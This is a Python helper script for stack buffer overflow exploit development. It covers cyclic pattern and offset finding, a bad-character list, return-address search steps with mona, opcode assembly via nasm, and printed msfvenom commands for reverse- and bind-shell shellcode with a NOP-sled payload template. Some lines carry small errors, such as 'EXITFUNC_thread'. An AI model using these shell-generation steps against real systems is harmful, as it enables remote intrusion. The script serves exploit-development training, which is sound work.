#!/usr/bin/env python3


"""
Exploithelper: A tool designed to help when developing buffer overflow exploits.
Usage: ./exploitherlper.py
Copyright (C) 2020  Javier Vidal Ruano

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License along
with this program; if not, write to the Free Software Foundation, Inc.,
51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
"""

# Author: Javier Vidal Ruano
# Website: https://javiervidrua.github.io
# Version 0.1
# Credits: phillips321 (for making a python 2 and 3 compatible function)
# About: Used the function from phillips321 to create
#  a tool to make buffer overflow exploit development
#  a litlle bit easier
#  (should be compatible with Python 2 and 3)
# Everything done by javiervidrua excep pattern_create()
########################################################


# Imports for making the code Python 2 and 3 compatible
from __future__ import print_function # print('Hello', end='') # print('Hello', file=sys.stderr)
from __future__ import division # assert 3 / 2 == 1.5 # assert 2 // 3 == 0
from future.utils import raise_with_traceback # raise_with_traceback(ValueError("dodgy value"))
from builtins import input # input() instead of raw_input() and input()
import future        # pip install future
import builtins      # pip install future
import past          # pip install future
import six           # pip install six
# My imports
import sys, os, getopt
import struct
import codecs, subprocess, tempfile


# ======= #
# CLASSES #
# ======= #
class NasmException(Exception):
    def __init__(self, retcode, msg):
        self.retcode = retcode
        self.msg = msg.strip()
        Exception.__init__(self, msg.strip())


# ========= #
# FUNCTIONS #
# ========= #
def assemble(asm, bits):
    asmfile = None 
    asmfd = None
    binfile = None
    try:
        asmfd, asmfile = tempfile.mkstemp()
        os.write(asmfd, b"[BITS %u]\n_start:\n"%(bits))
        os.write(asmfd, asm.encode())
        os.write(asmfd, b"\n")
        os.close(asmfd)

        binfile = asmfile + ".bin"
        assemble_to_file(asmfile, binfile)
        print(disassemble_file(binfile, bits))
    finally:
        if asmfile:
            os.unlink(asmfile)
        if binfile and os.path.exists(binfile): 
            os.unlink(binfile)


def assemble_to_file(asmfile, binfile):
    proc = subprocess.Popen(["nasm", "-fbin", "-o", binfile, asmfile],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    buf_out, buf_err = proc.communicate()
    buf_err = buf_err.decode()
    if proc.returncode != 0:
        raise NasmException(proc.returncode, parse_nasm_err(buf_err))


def disassemble_file(binfile, bits):
    proc = subprocess.Popen(["ndisasm", "-b%u"%(bits), binfile],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    buf_out, buf_err = proc.communicate()
    buf_out = buf_out.decode()
    buf_err = buf_err.decode()
    if proc.returncode != 0:
        raise NasmException(proc.returncode, buf_err)
    else:
        return parse_disassembly(buf_out)


def generateBadchars():
    return ("""badchars=(\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"
\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"
\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"
\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"
\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"
\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"
\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"
\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"
\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"
\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"
\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"
\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"
\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"
\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"
\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"
\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n""")


def interactive():
    # 0 - Print GPL license
    print("""Exploithelper version 0.1, Copyright (C) 2020 Javier Vidal Ruano
    Exploithelper comes with ABSOLUTELY NO WARRANTY.
    This is free software, and you are welcome to redistribute it
    under certain conditions.""")

    # 1 - Create the pattern
    print(( pattern_create( int(input('[*] Pattern lenght: ')) )+'\n'))

    # 2 - Get the offset
    offset = input('[*] Enter the offset (4 bytes): ')
    offset = ('0x'+offset if '0x' not in offset else offset)
    #if '0x' not in offset:
    #     offset = '0x' + offset
    #offset = '69413269' # For debugging purposes
    #print ('[-] Do not forget to uncomment these debugging lines!!!')
    offset = pattern_offset(offset)
    if offset == -1:
        raise Exception('[-] Error: pattern_offset: Could not find the correct offset')
    print('[*] The offset is: ' + offset + '\n')

    # 3 - Get the badchars
    print ('[*] Printing badchars ready to paste on Python code')
    print (generateBadchars())

    # 4 - Get a return address
    print ('[*] Printing how to find a return address')
    printReturnAddressInstructions()

    # 5 - Get the opcode of the instructions you want
    instructions = input('[*] Enter the instructions: ')
    print('[*] Opcodes: ')
    assemble(instructions.replace(';','\n'), 32)

    # 6 - Generate the shellcode with metasploit
    print('\n[*] Printing some commands to generate shellcode with metasploit:')
    print('REVERSE TCP WINDOWS32: msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=443 EXITFUNC=thread -a x86 --platform Windows -f c -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai\n')
    print('REVERSE TCP LINUX32: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<YOUR IP> LPORT=443 EXITFUNC_thread -a x86 --platform Linux -f c -b "\\x00\\x0a\\x0d\\x20" -e x86/shikata_ga_nai\n')
    print('BIND TCP WINDOWS32: msfvenom -p windows/shell_bind_tcp LHOST=<YOUR IP> LPORT=443 EXITFUNC=thread -a x86 --platform Windows -f c -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai\n')
    print('BIND TCP LINUX32: msfvenom -p linux/x86/shell_bind_tcp LHOST=<YOUR IP> LPORT=443 EXITFUNC_thread -a x86 --platform Linux -f c -b "\\x00\\x0a\\x0d\\x20" -e x86/shikata_ga_nai\n')

    # 7 - Do not forget to put some NOP before the shellcode
    print('\n[*] Do not forget to put some NOP instructions before the shellcode:')
    print('shellcode = "\\x90\\x90\\x90\\x90" + shellcode' )
    print('payload = offset + return_address + "\\x90\\x90\\x90\\x90" + shellcode' )


def parse_disassembly(disas):
    cur_opcodes = ''
    cur_disas = ''
    s = ''
    for line in disas.splitlines():
        line = line.strip()
        if len(line) > 0:
            # break out the elements of the line
            elems = line.split(None, 2)
            if len(elems) == 3:
                # starts a new instruction, append previous and clear our state
                if len(cur_opcodes) > 0:
                    s += "%-24s %s\n" % (cur_opcodes, cur_disas)
                cur_opcodes = ''
                # offset, opcodes, disas-text
                cur_disas = elems[2]
                cur_opcodes = elems[1]
            elif len(elems) == 1 and elems[0][0] == '-':
                # continuation
                cur_opcodes += elems[0][1:]
    # append last instruction
    if len(cur_opcodes) > 0:
        s += "%-24s %s" % (cur_opcodes, cur_disas)
    return s


def parse_nasm_err(errstr):
    return errstr.split(' ', 1)[1]


# Author of the function: phillips321
# Site: www.phillips321.co.uk
# Version 0.1
# Credits: metasploit project
# About: Replicates msf pattern_create.rb (python3 compatible)
########################################################
def pattern_create(length, set_a=None, set_b=None, set_c=None):
    if not isinstance(length, int):
        raise Exception('[-] Length must be an integer')

    if not set_a: seta="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if not set_b: setb="abcdefghijklmnopqrstuvwxyz"
    if not set_c: setc="0123456789"

    string="" ; a=0 ; b=0 ; c=0
    
    while len(string) < length:
        if not set_a and not set_b and not set_c:
            string += seta[a] + setb[b] + setc[c]
            c+=1
            if c == len(setc):c=0;b+=1
            if b == len(setb):b=0;a+=1
            if a == len(seta):a=0
        elif set_a and not set_b and not set_c:
            raise Exception('[-] Error: pattern_create: Cannot work with just one set!')
        elif set_a and set_b and not set_c:
            string += seta[a] + setb[b]
            b+=1
            if b == len(setb):b=0;a+=1
            if a == len(seta):a=0
        elif set_a and set_b and set_c:
            string += seta[a] + setb[b] + setc[c]
            c+=1
            if c == len(setc):c=0;b+=1
            if b == len(setb):b=0;a+=1
            if a == len(seta):a=0
        else:
            raise Exception('[-] Error: pattern_create: Input error: Please check your parameters')

    return string[:length]


def pattern_offset(buffer, lenght=8192): # By default the lenght is 8192, but it is not fixed
    pattern = pattern_create(lenght)
    
    #string = reverse(buffer.decode('hex')) # For python2 # Reverse because it is little endian, decode.('hex') because the input value is in hexadecimal
    decode_hex = codecs.getdecoder("hex_codec")
    string = reverse( decode_hex(buffer)[0] ).decode('utf-8') # Decode the hex into bytes. Decode bytes into utf-8 (string). Reverse the string because it's in little endian.

    return str(pattern.find(string))


def printReturnAddressInstructions():
    print('\t1 - Search the modules:')
    print('\t\t* Imunnity Debugger: !mona modules')
    print('\t\t* Evans\' debugger: Plugins -> Opcode search')
    print('\t2 - Choose a module that hasn\'t got any security measures (DEP, ASLR, Rebase,...) enabled')
    print('\t3 - Get the opcode of the instructions you want')
    print('\t4 - Search the chosen module for that instruction:')
    print('\t\t* Imunnity Debugger: !mona find -s "\\xOPCODE" -m MODULE')
    print('\t\t* Evans\' debugger: Plugins -> Opcode search -> Select the module you want to search in')
    print('\t5 - Get the return address of the chosen instruction and use it in your exploit\n')


# Just an alias for [::-1]
def reverse(string):
    return string[::-1]


# ==== #
# MAIN #
# ==== #
if __name__ == "__main__":
    interactive()
    # Use getopt and add a help flag (-h)
